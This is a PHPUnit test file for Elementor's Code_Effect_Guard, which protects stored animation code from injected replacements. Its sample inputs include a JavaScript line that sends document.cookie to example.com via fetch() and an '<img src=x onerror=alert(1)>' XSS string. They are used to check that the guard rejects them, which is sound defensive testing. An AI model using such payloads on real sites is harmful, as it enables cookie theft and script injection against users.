<?php

use Elementor\Modules\Interactions\Code_Effect_Guard;
use PHPUnit\Framework\TestCase;

/**
 * @group Elementor\Modules
 * @group Elementor\Modules\Interactions
 */
class Test_Code_Effect_Guard extends TestCase {
	const STORED_CODE = '({ element, params, motion }) => motion.animate( element, { x: params.distance } ).stop';
	const INJECTED_CODE = '({ element }) => fetch( "https://example.com/?c=" + document.cookie )';
	const STORED_DISTANCE = 100;
	const EDITED_DISTANCE = 250;

	public function test_protect__keeps_stored_code_and_applies_param_value_change() {
		// Arrange.
		$guard = new Code_Effect_Guard( [ $this->element( [ $this->code_item( 'stored-id', self::STORED_CODE, self::STORED_DISTANCE ) ] ) ] );
		$incoming = $this->document( [ $this->code_item( 'stored-id', self::INJECTED_CODE, self::EDITED_DISTANCE ) ] );

		// Act.
		$result = $guard->protect( $incoming );

		// Assert.
		$code_effect = $result['elements'][0]['interactions']['items'][0]['value']['animation']['value']['code_effect'];
		$this->assertSame( self::STORED_CODE, $code_effect['value']['code']['value'] );
		$this->assertSame( self::EDITED_DISTANCE, $code_effect['value']['params']['value'][0]['value']['value']['value'] );
		$this->assertSame( 0, $guard->get_stripped_count() );
	}

	public function test_protect__drops_new_code_effect_items() {
		// Arrange.
		$guard = new Code_Effect_Guard( [] );
		$incoming = $this->document( [
			$this->code_item( 'temp-123', self::INJECTED_CODE, self::STORED_DISTANCE ),
			$this->fade_item( 'fade-id' ),
		] );

		// Act.
		$result = $guard->protect( $incoming );

		// Assert.
		$items = $result['elements'][0]['interactions']['items'];
		$this->assertCount( 1, $items );
		$this->assertSame( 'fade', $items[0]['value']['animation']['value']['effect']['value'] );
		$this->assertSame( 1, $guard->get_stripped_count() );
	}

	public function test_protect__removes_code_payload_from_non_code_items() {
		// Arrange.
		$guard = new Code_Effect_Guard( [] );
		$item = $this->code_item( 'fade-id', self::INJECTED_CODE, self::STORED_DISTANCE );
		$item['value']['animation']['value']['effect']['value'] = 'fade';

		// Act.
		$result = $guard->protect( $this->document( [ $item ] ) );

		// Assert.
		$animation_value = $result['elements'][0]['interactions']['items'][0]['value']['animation']['value'];
		$this->assertArrayNotHasKey( 'code_effect', $animation_value );
		$this->assertSame( 'fade', $animation_value['effect']['value'] );
	}

	public function test_protect__ignores_param_value_with_different_type() {
		// Arrange.
		$guard = new Code_Effect_Guard( [ $this->element( [ $this->code_item( 'stored-id', self::STORED_CODE, self::STORED_DISTANCE ) ] ) ] );
		$incoming_item = $this->code_item( 'stored-id', self::STORED_CODE, self::EDITED_DISTANCE );
		$incoming_item['value']['animation']['value']['code_effect']['value']['params']['value'][0]['value']['value'] = [
			'$$type' => 'string',
			'value' => '<img src=x onerror=alert(1)>',
		];

		// Act.
		$result = $guard->protect( $this->document( [ $incoming_item ] ) );

		// Assert.
		$param = $result['elements'][0]['interactions']['items'][0]['value']['animation']['value']['code_effect']['value']['params']['value'][0];
		$this->assertSame( [ '$$type' => 'number', 'value' => self::STORED_DISTANCE ], $param['value']['value'] );
	}

	public function test_protect__reads_stored_code_from_nested_elements_and_json_interactions() {
		// Arrange.
		$stored_child = $this->element( [ $this->code_item( 'nested-id', self::STORED_CODE, self::STORED_DISTANCE ) ] );
		$stored_child['interactions'] = json_encode( $stored_child['interactions'] );
		$stored_parent = [
			'id' => 'parent',
			'elements' => [ $stored_child ],
		];
		$guard = new Code_Effect_Guard( [ $stored_parent ] );
		$incoming = $this->document( [ $this->code_item( 'nested-id', self::INJECTED_CODE, self::STORED_DISTANCE ) ] );
		$incoming['elements'][0]['interactions'] = json_encode( $incoming['elements'][0]['interactions'] );

		// Act.
		$result = $guard->protect( $incoming );

		// Assert.
		$code_effect = $result['elements'][0]['interactions']['items'][0]['value']['animation']['value']['code_effect'];
		$this->assertSame( self::STORED_CODE, $code_effect['value']['code']['value'] );
	}

	private function document( array $items ): array {
		return [ 'elements' => [ $this->element( $items ) ] ];
	}

	private function element( array $items ): array {
		return [
			'id' => 'element',
			'interactions' => [
				'items' => $items,
				'version' => 1,
			],
		];
	}

	private function code_item( string $interaction_id, string $code, int $distance ): array {
		return [
			'$$type' => 'interaction-item',
			'value' => [
				'interaction_id' => [ '$$type' => 'string', 'value' => $interaction_id ],
				'trigger' => [ '$$type' => 'string', 'value' => 'load' ],
				'animation' => [
					'$$type' => 'animation-preset-props',
					'value' => [
						'effect' => [ '$$type' => 'string', 'value' => 'code' ],
						'code_effect' => [
							'$$type' => 'code-effect',
							'value' => [
								'code' => [ '$$type' => 'code', 'value' => $code ],
								'params' => [
									'$$type' => 'code-effect-params',
									'value' => [
										[
											'$$type' => 'code-effect-param',
											'value' => [
												'key' => [ '$$type' => 'string', 'value' => 'distance' ],
												'label' => [ '$$type' => 'string', 'value' => 'Distance' ],
												'control' => [ '$$type' => 'string', 'value' => 'slider' ],
												'value' => [ '$$type' => 'number', 'value' => $distance ],
											],
										],
									],
								],
							],
						],
					],
				],
			],
		];
	}

	private function fade_item( string $interaction_id ): array {
		return [
			'$$type' => 'interaction-item',
			'value' => [
				'interaction_id' => [ '$$type' => 'string', 'value' => $interaction_id ],
				'trigger' => [ '$$type' => 'string', 'value' => 'load' ],
				'animation' => [
					'$$type' => 'animation-preset-props',
					'value' => [
						'effect' => [ '$$type' => 'string', 'value' => 'fade' ],
					],
				],
			],
		];
	}
}
